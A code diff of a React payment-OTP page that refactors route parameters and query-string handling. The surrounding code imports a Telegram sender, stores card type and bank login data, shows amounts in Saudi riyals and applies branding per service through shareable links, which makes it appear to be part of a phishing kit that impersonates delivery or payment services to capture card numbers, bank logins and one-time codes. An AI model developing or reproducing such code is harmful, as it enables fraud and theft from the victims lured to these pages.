@@ -11,11 +11,11 @@ import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 
 const PaymentOTPForm = () => {
-  const { id } = useParams();
+  const { id: rawIdParam } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData, isLoading } = useLink(id);
-  const initialSearch = useMemo(() => (typeof window !== "undefined" ? window.location.search : ""), []);
+  const shareId = rawIdParam || "";
+  const { data: linkData, isLoading } = useLink(shareId);
   const urlServiceKey = useMemo(
     () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
     []
@@ -54,14 +54,7 @@ const PaymentOTPForm = () => {
   const branding = getServiceBranding(serviceKey);
   const amount = payload?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
-  const serviceQuery = useMemo(() => {
-    const params = new URLSearchParams(initialSearch || "");
-    if (serviceKey) {
-      params.set('service', serviceKey);
-    }
-    const search = params.toString();
-    return search ? `?${search}` : "";
-  }, [initialSearch, serviceKey]);
+  const serviceQuery = "";
 
   useEffect(() => {
     if (serviceKey) {
@@ -77,16 +70,10 @@ const PaymentOTPForm = () => {
     const sessionService = sessionStorage.getItem('serviceKey');
     const payloadService = linkData?.payload?.service_key || linkData?.payload?.service;
     const serviceKeyParam = payloadService || urlServiceKey || customerInfo.serviceKey || sessionService;
-    const params = new URLSearchParams(initialSearch || "");
-    if (serviceKeyParam) {
-      params.set('service', serviceKeyParam);
-    }
-    const search = params.toString();
-    const effectiveQuery = search ? `?${search}` : "";
     if (!method) {
-      navigate(`/pay/${id}/track${effectiveQuery}`);
+      navigate(`/pay/${shareId}/track`);
     }
-  }, [id, navigate, linkData, urlServiceKey, customerInfo.serviceKey, initialSearch]);
+  }, [shareId, navigate, linkData, urlServiceKey, customerInfo.serviceKey]);
 
   // Countdown timer effect
   useEffect(() => {
@@ -273,7 +260,7 @@ const PaymentOTPForm = () => {
       sessionStorage.removeItem('cardType');
       sessionStorage.removeItem('bankLoginData');
 
-      navigate(`/pay/${id}/receipt${serviceQuery}`);
+      navigate(`/pay/${shareId}/receipt`);
     } else {
       const newAttempts = attempts + 1;
       setAttempts(newAttempts);
